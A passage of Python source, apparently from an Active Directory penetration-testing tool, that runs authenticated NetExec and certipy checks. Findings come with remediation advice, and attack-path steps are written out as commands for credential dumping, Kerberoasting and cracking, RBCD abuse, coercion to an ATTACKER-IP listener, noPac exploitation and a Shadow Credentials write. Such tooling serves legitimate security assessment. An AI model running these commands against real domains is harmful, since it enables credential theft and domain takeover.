"""Authenticated checks - require valid domain credentials.

With a valid domain account we can inspect the directory in far more depth:

* Password policy (lockout, min length, complexity)
* Domain user / admin enumeration
* Share enumeration with read/write mapping
* Kerberoastable service accounts
* Unconstrained / constrained delegation
* Resource-based constrained delegation (RBCD) enumeration
* MachineAccountQuota (adds risk for several privilege-escalation paths)
* LDAP signing / channel binding posture
* LAPS / gMSA managed-password readability
* DnsAdmins group membership (DLL-load-as-SYSTEM on the DC's DNS service)
* Shadow Credentials (msDS-KeyCredentialLink) write access
* Certifried (CVE-2022-26923) exposure

Every check is a no-op that returns a *skipped* CheckResult when the required
tool is missing or when no credentials are available.
"""

from __future__ import annotations

import re

from ..paths import Capability, Noise, PathStep, Reliability
from ..runner import CheckResult, Finding, Severity, Target, ToolRunner
from . import looks_like_failure, require_tool, skipped_result

CATEGORY = "authenticated"


def _base_result(name: str) -> CheckResult:
    return CheckResult(name=name, category=CATEGORY)


def _guard(runner: ToolRunner, target: Target, name: str, tool: str = "nxc") -> CheckResult | None:
    """Common precondition check: credentials present and tool available."""
    if not target.authenticated:
        return skipped_result(name, CATEGORY, "no credentials supplied")
    return require_tool(runner, tool, name, CATEGORY)


def check_password_policy(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
    name = "Domain password policy"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args(), "--pass-pol"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    min_len_match = re.search(r"Minimum password length:\s*(\d+)", text)
    if min_len_match:
        min_len = int(min_len_match.group(1))
        if min_len < 12:
            result.add_finding(
                Finding(
                    title="Weak minimum password length",
                    severity=Severity.MEDIUM,
                    target=target.domain or target.host,
                    description=(
                        f"Minimum password length is {min_len}. Short passwords "
                        "are more susceptible to spraying and offline cracking."
                    ),
                    evidence=min_len_match.group(0),
                    remediation="Set a minimum password length of 14+ characters.",
                )
            )

    lockout_match = re.search(r"Account Lockout Threshold:\s*(\d+|None)", text)
    if lockout_match and lockout_match.group(1) in ("0", "None"):
        result.add_finding(
            Finding(
                title="No account lockout threshold",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description=(
                    "Account lockout is disabled, enabling unlimited password "
                    "guessing / spraying against domain accounts."
                ),
                evidence=lockout_match.group(0),
                remediation="Configure a sensible lockout threshold (e.g. 5-10).",
            )
        )
    return result


def check_admin_access(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
    """Detect if the supplied account has local admin (Pwn3d!) on the host."""
    name = "Local admin access with supplied account"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args()]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    if "Pwn3d!" in out.combined:
        result.add_finding(
            Finding(
                title="Supplied account has local administrator access",
                severity=Severity.HIGH,
                target=target.host,
                description=(
                    "The provided credentials grant local administrator rights "
                    "on this host, enabling credential dumping and lateral movement."
                ),
                evidence="netexec reported 'Pwn3d!'",
                remediation=(
                    "Review membership of local Administrators; apply least "
                    "privilege and LAPS for local admin passwords."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Local admin -> dump credentials",
                technique="Cred-dump",
                requires=frozenset({Capability.VALID_CREDENTIALS, Capability.LOCAL_ADMIN}),
                grants=Capability.CRACKABLE_HASH,
                command=f"nxc smb {target.host} -u USER -p PASS --lsa --sam",
                description=(
                    "Dump LSA secrets / SAM from a host where the account is "
                    "local admin; may yield privileged hashes for reuse."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.MODERATE,
                detail=target.host,
                source="check",
            )
        )
        # The account is already local admin; record that capability directly.
        result.add_step(
            PathStep(
                name="Confirmed local admin on host",
                technique="Local-admin",
                requires=frozenset({Capability.VALID_CREDENTIALS}),
                grants=Capability.LOCAL_ADMIN,
                command=f"nxc smb {target.host} -u USER -p PASS  # (Pwn3d!)",
                description="Supplied account is local admin on this host.",
                reliability=Reliability.GUARANTEED,
                noise=Noise.QUIET,
                detail=target.host,
                source="check",
            )
        )
    return result


def check_kerberoast(runner: ToolRunner, target: Target, timeout: int = 240) -> CheckResult:
    """Find Kerberoastable service accounts (accounts with SPNs)."""
    name = "Kerberoastable service accounts"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "--kerberoasting", "/dev/stdout"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    hashes = re.findall(r"\$krb5tgs\$\S+", out.combined)
    if hashes:
        result.add_finding(
            Finding(
                title="Kerberoastable accounts found",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    f"{len(hashes)} service account(s) with SPNs returned TGS "
                    "hashes that can be cracked offline to recover passwords."
                ),
                evidence="\n".join(h[:80] + "..." for h in hashes[:10]),
                remediation=(
                    "Use group Managed Service Accounts (gMSA) or long random "
                    "passwords (25+ chars) for SPN-bearing accounts."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Kerberoast -> TGS hash",
                technique="Kerberoast",
                requires=frozenset({Capability.VALID_CREDENTIALS}),
                grants=Capability.SPN_TGS,
                command=f"nxc ldap {target.host} -u USER -p PASS --kerberoasting out.tgs",
                description="Request TGS for SPN accounts to crack offline.",
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                source="check",
            )
        )
        result.add_step(
            PathStep(
                name="Crack TGS -> service-account credentials",
                technique="Hash-crack",
                requires=frozenset({Capability.SPN_TGS}),
                grants=Capability.VALID_CREDENTIALS,
                command="hashcat -m 13100 out.tgs wordlist.txt",
                description=(
                    "Crack the TGS offline. Service accounts are often "
                    "privileged, so this can jump privilege tiers."
                ),
                reliability=Reliability.SPECULATIVE,
                noise=Noise.QUIET,
                source="check",
            )
        )
    return result


def check_delegation(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Enumerate accounts configured for Kerberos delegation."""
    name = "Kerberos delegation configuration"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "--find-delegation"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    if re.search(r"Unconstrained", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Unconstrained delegation configured",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    "One or more accounts allow unconstrained delegation. If an "
                    "attacker compromises such a host they can capture TGTs of "
                    "any authenticating user, including domain admins."
                ),
                evidence=text[:800],
                remediation=(
                    "Remove unconstrained delegation; use constrained or "
                    "resource-based constrained delegation and mark sensitive "
                    "accounts as 'Account is sensitive and cannot be delegated'."
                ),
            )
        )
    elif re.search(r"Constrained|delegation", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Delegation configured (review recommended)",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description="Delegation relationships were found and should be reviewed.",
                evidence=text[:800],
                remediation="Audit delegation targets and remove where unnecessary.",
            )
        )
    return result


def check_machine_account_quota(
    runner: ToolRunner, target: Target, timeout: int = 120
) -> CheckResult:
    """Read ms-DS-MachineAccountQuota; a nonzero value enables several attacks."""
    name = "MachineAccountQuota"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = [
        "nxc",
        "ldap",
        target.host,
        *target.nxc_auth_args(),
        "-M",
        "maq",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    m = re.search(r"MachineAccountQuota:\s*(\d+)", out.combined)
    if m and int(m.group(1)) > 0:
        result.add_finding(
            Finding(
                title=f"MachineAccountQuota is {m.group(1)}",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description=(
                    "Any authenticated user can join up to "
                    f"{m.group(1)} computer(s) to the domain. This enables "
                    "attacks such as noPac and RBCD abuse."
                ),
                evidence=m.group(0),
                remediation="Set ms-DS-MachineAccountQuota to 0 and delegate "
                "machine-join rights explicitly.",
            )
        )
        result.add_step(
            PathStep(
                name="Create machine account (MAQ>0)",
                technique="MAQ-abuse",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.MACHINE_ACCOUNT,
                command=(
                    "addcomputer.py -computer-name 'PWN$' -computer-pass 'Passw0rd!' "
                    f"-dc-host {target.dc_ip or 'DC'} {target.domain}/USER:PASS"
                ),
                description=(
                    "Any authenticated user can add a computer account, a "
                    "prerequisite for RBCD and some noPac paths."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.MODERATE,
                source="check",
            )
        )
        # A controlled machine account + write over a target enables RBCD.
        result.add_step(
            PathStep(
                name="Configure RBCD -> impersonate on target",
                technique="RBCD",
                requires=frozenset({Capability.MACHINE_ACCOUNT, Capability.DACL_CONTROL}),
                grants=Capability.LOCAL_ADMIN,
                command=(
                    "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' "
                    f"-action write {target.domain}/USER:PASS"
                ),
                description=(
                    "With write access over a computer object and a controlled "
                    "machine account, configure resource-based constrained "
                    "delegation and request a service ticket as any user."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.MODERATE,
                source="check",
            )
        )
    return result


def check_rbcd(runner: ToolRunner, target: Target, timeout: int = 240) -> CheckResult:
    """Actively enumerate resource-based constrained delegation across hosts.

    Two things are reported:

    * Computer objects that already have
      ``msDS-AllowedToActOnBehalfOfOtherIdentity`` populated (an existing RBCD
      relationship worth reviewing / potentially abusable).
    * A path step noting that any computer object over which we hold write
      access can have RBCD configured against it.

    This complements the BloodHound-sourced RBCD edges by reading the attribute
    directly via LDAP, so RBCD opportunities surface even without a graph.
    """
    name = "RBCD enumeration (msDS-AllowedToActOnBehalfOfOtherIdentity)"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    # NetExec's LDAP --query lets us read the RBCD attribute across computers.
    argv = [
        "nxc",
        "ldap",
        target.host,
        *target.nxc_auth_args(),
        "--query",
        "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
        "sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # Hosts with the attribute present -> existing RBCD relationships.
    configured = re.findall(r"(\S+\$)\s", text)
    if re.search(r"AllowedToActOnBehalfOfOtherIdentity", text, re.IGNORECASE) and configured:
        result.add_finding(
            Finding(
                title="Existing RBCD relationships found",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description=(
                    "One or more computer accounts have "
                    "msDS-AllowedToActOnBehalfOfOtherIdentity populated. Review "
                    "these delegation relationships; an attacker controlling a "
                    "referenced principal can impersonate users to the host."
                ),
                evidence="\n".join(sorted(set(configured))[:30]) or text[:600],
                remediation=(
                    "Audit RBCD configuration; remove entries that are not "
                    "explicitly required and monitor writes to this attribute."
                ),
            )
        )

    # Regardless of existing config, holding write over a computer object lets
    # us configure RBCD against it. This connects DACL control -> RBCD.
    result.add_step(
        PathStep(
            name="Write over computer object -> configure RBCD",
            technique="RBCD-Configure",
            requires=frozenset({Capability.DACL_CONTROL, Capability.MACHINE_ACCOUNT}),
            grants=Capability.RBCD,
            command=(
                "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' "
                f"-action write {target.domain or 'DOMAIN'}/USER:PASS"
            ),
            description=(
                "With write access over a target computer object and a "
                "controlled machine account, set "
                "msDS-AllowedToActOnBehalfOfOtherIdentity to enable RBCD."
            ),
            reliability=Reliability.HIGH,
            noise=Noise.MODERATE,
            source="check",
        )
    )
    return result


def check_coercion(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Detect authentication-coercion surfaces on the target.

    Probes for the common coercion vectors that let an attacker force a
    computer (often a DC) to authenticate to an attacker-controlled host:

    * MS-EFSR  (PetitPotam)
    * MS-RPRN  (PrinterBug / spooler)
    * MS-DFSNM (DFSCoerce)
    * MS-FSRVP (ShadowCoerce)

    Uses NetExec's ``coerce_plus`` module in listen/check mode. A coercible
    host makes the WebDAV/relay and ESC8 chains real rather than assumed, so a
    positive result grants the COERCIBLE_AUTH capability.
    """
    name = "Authentication coercion surfaces (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce)"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    # coerce_plus with CHECK=True probes the vectors without firing a relay.
    argv = [
        "nxc", "smb", target.host, *target.nxc_auth_args(),
        "-M", "coerce_plus", "-o", "CHECK=True",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # coerce_plus reports vulnerable methods, e.g. "VULNERABLE" / method names.
    vectors = []
    for label, pat in (
        ("MS-EFSR (PetitPotam)", r"efsr|petitpotam"),
        ("MS-RPRN (PrinterBug)", r"rprn|printerbug|spooler"),
        ("MS-DFSNM (DFSCoerce)", r"dfsnm|dfscoerce"),
        ("MS-FSRVP (ShadowCoerce)", r"fsrvp|shadowcoerce"),
    ):
        if re.search(pat, text, re.IGNORECASE) and re.search(r"vulnerable|coerc", text, re.IGNORECASE):
            vectors.append(label)

    if vectors:
        result.add_finding(
            Finding(
                title="Host is coercible to authenticate",
                severity=Severity.HIGH,
                target=target.host,
                description=(
                    "The host responded to one or more coercion vectors ("
                    + ", ".join(vectors) + "). It can be forced to authenticate "
                    "to an attacker-controlled listener, enabling NTLM relay "
                    "(to LDAP for RBCD/shadow-creds, or to AD CS for ESC8)."
                ),
                evidence=text[:800],
                remediation=(
                    "Patch coercion CVEs, disable the Print Spooler on DCs where "
                    "not needed, restrict RPC, and enforce SMB/LDAP signing and "
                    "channel binding to neutralise relay."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Coerce host authentication",
                technique="Coercion",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.COERCIBLE_AUTH,
                command=(
                    f"coercer coerce -u USER -p PASS -t {target.host} -l ATTACKER-IP"
                ),
                description="Force the host to authenticate to an attacker listener.",
                reliability=Reliability.HIGH,
                noise=Noise.LOUD,
                detail=", ".join(vectors),
                source="check",
            )
        )
    return result


def check_nopac(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Detect noPac (CVE-2021-42278/42287) - sAMAccountName spoofing to DA.

    When a DC is unpatched and MachineAccountQuota permits creating a computer
    account, noPac impersonates a DC to obtain a privileged ticket, which is a
    direct, high-reliability route to DCSync / Domain Admin.
    """
    name = "noPac (CVE-2021-42278 / CVE-2021-42287)"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args(), "-M", "nopac"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # The nopac module indicates vulnerability, e.g. "VULNERABLE" / "got TGT".
    if re.search(r"vulnerable|nopac.*success|got tgt", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Domain Controller vulnerable to noPac",
                severity=Severity.CRITICAL,
                target=target.host,
                description=(
                    "The DC is vulnerable to noPac (CVE-2021-42278/42287). Any "
                    "authenticated user who can create a computer account can "
                    "impersonate a domain controller and obtain privileged "
                    "tickets, leading directly to Domain Admin / DCSync."
                ),
                evidence=text[:600],
                remediation=(
                    "Apply the November 2021 (and later) patches on all DCs and "
                    "set ms-DS-MachineAccountQuota to 0."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="noPac -> privileged ticket / DCSync",
                technique="noPac",
                requires=frozenset({Capability.LOW_PRIV_USER, Capability.MACHINE_ACCOUNT}),
                grants=Capability.DCSYNC,
                command=(
                    "noPac.py -dc-ip {dc} DOMAIN/USER:PASS -dump".format(
                        dc=target.dc_ip or "DC-IP"
                    )
                ),
                description=(
                    "Exploit noPac to impersonate a DC and dump secrets "
                    "(equivalent to DCSync / Domain Admin)."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.LOUD,
                source="check",
            )
        )
    return result


def check_gpp_cpassword(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Search SYSVOL Group Policy Preferences for cpassword secrets.

    GPP XML files (Groups.xml, Services.xml, ScheduledTasks.xml, etc.) can carry
    a ``cpassword`` attribute encrypted with a *public, Microsoft-published* AES
    key, so any authenticated user who can read SYSVOL can trivially decrypt it.
    The recovered credentials are valid domain credentials, frequently for a
    privileged local/service account.
    """
    name = "GPP cpassword in SYSVOL"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    # NetExec's gpp_password module reads SYSVOL and decrypts any cpassword.
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args(), "-M", "gpp_password"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # The module prints recovered "Username: ... Password: ..." pairs. Treat any
    # recovered credential (or an explicit cpassword hit) as a finding.
    creds = re.findall(r"[Uu]sername\s*:\s*(\S+).*?[Pp]assword\s*:\s*(\S+)", text, re.DOTALL)
    if creds or re.search(r"cpassword|Found credentials", text, re.IGNORECASE):
        users = ", ".join(sorted({u for u, _ in creds}))[:200]
        result.add_finding(
            Finding(
                title="GPP cpassword credentials recovered from SYSVOL",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    "Group Policy Preferences in SYSVOL contained a cpassword "
                    "value encrypted with the public Microsoft AES key. It was "
                    "decrypted to plaintext domain credentials, usable "
                    "immediately for authenticated access."
                ),
                evidence=text[:600],
                remediation=(
                    "Remove GPP items containing cpassword from SYSVOL and apply "
                    "KB2962486. Rotate any exposed account passwords."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Recover GPP cpassword -> credentials",
                technique="GPP-cpassword",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.VALID_CREDENTIALS,
                command=f"nxc smb {target.host} -u USER -p PASS -M gpp_password",
                description=(
                    "Decrypt a SYSVOL GPP cpassword to recover valid (often "
                    "privileged) domain credentials."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                detail=users,
                source="check",
            )
        )
    else:
        signal = looks_like_failure(text)
        if signal:
            result.mark_inconclusive(
                f"GPP search inconclusive; output shows '{signal}'"
            )
        elif not re.search(r"gpp|sysvol|cpassword|no.*password", text, re.IGNORECASE):
            result.mark_inconclusive(
                "gpp_password module produced no recognizable output (module "
                "unavailable or output changed)"
            )
    return result


def check_pre2k_computers(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Find pre-Windows 2000 computer accounts with predictable passwords.

    A computer object created with the "assign as a pre-Windows 2000 computer"
    option (or left unprovisioned) has its password set to the lowercase of the
    account name without the trailing ``$``. Any such account is a free
    authenticated foothold.
    """
    name = "Pre-Windows 2000 computer accounts"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    # NetExec's pre2k module (ldap) flags computer accounts whose password
    # matches the pre-2000 default.
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "-M", "pre2k"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # The module reports each vulnerable computer account it authenticates as.
    accounts = re.findall(r"([A-Za-z0-9._-]+\$)", text)
    if accounts or re.search(r"pre2k|pre-?2000|VULNERABLE", text, re.IGNORECASE):
        names = ", ".join(sorted(set(accounts)))[:200]
        result.add_finding(
            Finding(
                title="Pre-Windows 2000 computer account(s) with default password",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    "One or more computer accounts have a password matching the "
                    "predictable pre-Windows 2000 default (lowercase account "
                    "name). These authenticate as a machine account and provide "
                    "an immediate domain foothold."
                ),
                evidence=text[:600],
                remediation=(
                    "Reset or re-provision affected computer accounts; avoid the "
                    "'pre-Windows 2000' compatibility option when creating them."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Authenticate as pre-2000 computer -> credentials",
                technique="Pre2k",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.VALID_CREDENTIALS,
                command=f"nxc ldap {target.host} -u USER -p PASS -M pre2k",
                description=(
                    "Authenticate with the predictable pre-2000 machine-account "
                    "password to obtain a domain foothold."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                detail=names,
                source="check",
            )
        )
    else:
        signal = looks_like_failure(text)
        if signal:
            result.mark_inconclusive(
                f"pre2k check inconclusive; output shows '{signal}'"
            )
        elif not re.search(r"pre2k|pre-?2000|computer|no.*account", text, re.IGNORECASE):
            result.mark_inconclusive(
                "pre2k module produced no recognizable output (module "
                "unavailable or output changed)"
            )
    return result


def check_laps_readability(
    runner: ToolRunner, target: Target, timeout: int = 180
) -> CheckResult:
    """Report which principals can currently read LAPS passwords.

    This is deliberately independent of a BloodHound collection: a direct
    ``nxc ldap -M laps`` sweep reports local-admin passwords the *supplied*
    account can read right now, which is useful even without a graph and also
    surfaces the legacy, cleartext-adjacent ``ms-Mcs-AdmPwd`` attribute
    (pre-Windows LAPS) distinctly from the newer encrypted LAPS v2 attribute.
    """
    name = "LAPS password readability"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "-M", "laps"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # The laps module prints recovered "Host: ... Password: ..." pairs.
    hosts = re.findall(r"([A-Za-z0-9._-]+\$?)\s*[:\-]\s*Password", text, re.IGNORECASE)
    if hosts or re.search(r"ms-?mcs-?admpwd|laps.*password", text, re.IGNORECASE):
        names = ", ".join(sorted(set(hosts)))[:200]
        result.add_finding(
            Finding(
                title="LAPS password(s) readable with supplied account",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    "The supplied account can read one or more LAPS-managed "
                    "local administrator passwords, a direct local-admin "
                    "credential on each affected host."
                ),
                evidence=text[:600],
                remediation=(
                    "Restrict the 'LAPS Password Readers' / "
                    "ms-Mcs-AdmPwd(V2) read ACL to only the groups that need "
                    "it, and audit membership regularly."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Read LAPS password",
                technique="LAPS-read",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.LAPS_READABLE,
                command=f"nxc ldap {target.host} -u USER -p PASS -M laps",
                description="Read a LAPS-managed local administrator password.",
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                detail=names,
                source="check",
            )
        )
    return result


def check_gmsa_readability(
    runner: ToolRunner, target: Target, timeout: int = 180
) -> CheckResult:
    """Report group-managed service account (gMSA) passwords readable by us.

    Complements BloodHound's ReadGMSAPassword edge with a direct check: any
    principal that can read ``msDS-ManagedPassword`` on a gMSA can decode it
    to that account's current NTLM hash immediately.
    """
    name = "gMSA managed-password readability"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "--gmsa"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # nxc's --gmsa prints "Account: NAME$    NTLM: <hash>" for each readable gMSA.
    accounts = re.findall(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", text)
    if accounts:
        names = ", ".join(sorted({a for a, _ in accounts}))[:200]
        result.add_finding(
            Finding(
                title="gMSA managed password(s) readable and decoded",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    f"{len(accounts)} group-managed service account "
                    "password(s) were decoded to a usable NTLM hash via "
                    "readable msDS-ManagedPassword."
                ),
                evidence=text[:600],
                remediation=(
                    "Restrict the gMSA's PrincipalsAllowedToRetrieveManagedPassword "
                    "to only the hosts/services that need it."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Read gMSA managed password",
                technique="gMSA-read",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.GMSA_READABLE,
                command=f"nxc ldap {target.host} -u USER -p PASS --gmsa",
                description=(
                    "Decode a readable gMSA's msDS-ManagedPassword to its "
                    "current NTLM hash."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                detail=names,
                source="check",
            )
        )
    else:
        signal = looks_like_failure(text)
        if signal:
            result.mark_inconclusive(f"gMSA check inconclusive; output shows '{signal}'")
        elif not re.search(r"gmsa|managedpassword|no.*gmsa", text, re.IGNORECASE):
            result.mark_inconclusive(
                "--gmsa produced no recognizable output (no gMSAs present, "
                "module unavailable, or output changed)"
            )
    return result


def check_dnsadmins_membership(
    runner: ToolRunner, target: Target, timeout: int = 180
) -> CheckResult:
    """Detect membership in DnsAdmins - a classic DLL-load-as-SYSTEM path.

    A member of DnsAdmins can set ``dnscmd /config /serverlevelplugindll`` to
    an attacker-controlled DLL, which the DNS service (frequently running as
    SYSTEM on a DC) loads. This is checked directly via LDAP group membership
    rather than requiring a BloodHound collection.
    """
    name = "DnsAdmins group membership"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = [
        "nxc", "ldap", target.host, *target.nxc_auth_args(),
        "--query", "(&(objectClass=group)(cn=DnsAdmins))", "member",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    members = re.findall(r"CN=([^,]+),", text)
    if members:
        names = ", ".join(sorted(set(members)))[:200]
        result.add_finding(
            Finding(
                title="DnsAdmins group has members",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    f"DnsAdmins has {len(set(members))} member(s): {names}. Any "
                    "member can configure the DNS service to load an arbitrary "
                    "DLL, typically yielding SYSTEM on the DC running DNS."
                ),
                evidence=text[:600],
                remediation=(
                    "Limit DnsAdmins membership to Domain Admins only, and "
                    "restrict who can modify dnscmd server-level plugin "
                    "settings."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="DnsAdmins member -> DLL load as SYSTEM",
                technique="DnsAdmins-abuse",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.DNSADMINS_MEMBER,
                command=(
                    f"nxc ldap {target.host} -u USER -p PASS --query "
                    "'(cn=DnsAdmins)' member"
                ),
                description="Confirmed membership in DnsAdmins.",
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                detail=names,
                source="check",
            )
        )
    else:
        signal = looks_like_failure(text)
        if signal:
            result.mark_inconclusive(
                f"DnsAdmins query inconclusive; output shows '{signal}'"
            )
        elif not re.search(r"dnsadmins|member", text, re.IGNORECASE):
            result.mark_inconclusive(
                "DnsAdmins query produced no recognizable output (query "
                "unsupported or output changed)"
            )
    return result


def check_shadow_credentials_writable(
    runner: ToolRunner, target: Target, timeout: int = 180
) -> CheckResult:
    """Check whether the supplied account can write its own Shadow Credentials.

    Some environments leave the default "Validated write to
    msDS-KeyCredentialLink" self-right enabled, letting any authenticated
    user add a key credential to their *own* account and authenticate as
    themselves via PKINIT - not a privilege escalation on its own, but this
    check exists to catch the broader case where self-write (or write on
    another principal) is enabled, complementing BloodHound's
    AddKeyCredentialLink ACL edges for environments where no graph was
    collected or it is stale.
    """
    name = "Shadow Credentials (msDS-KeyCredentialLink) write access"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = [
        "certipy", "shadow", "auto",
        "-u", f"{target.username}@{target.domain}" if target.domain else (target.username or ""),
        "-account", target.username or "",
    ]
    if target.nthash:
        argv += ["-hashes", target.nthash]
    elif target.password:
        argv += ["-p", target.password]
    if target.dc_ip:
        argv += ["-dc-ip", target.dc_ip]
    skip = require_tool(runner, "certipy", name, CATEGORY)
    if skip:
        alt = require_tool(runner, "certipy-ad", name, CATEGORY)
        if alt:
            return alt
        argv[0] = "certipy-ad"

    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    if re.search(r"Updated the.*msDS-KeyCredentialLink|Generating certificate|Saved PFX", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Shadow Credentials write succeeded",
                severity=Severity.MEDIUM,
                target=target.username or target.host,
                description=(
                    "The supplied account could add a Shadow Credential "
                    "(msDS-KeyCredentialLink) to its own object. Where this "
                    "same write right extends to other principals (owned or "
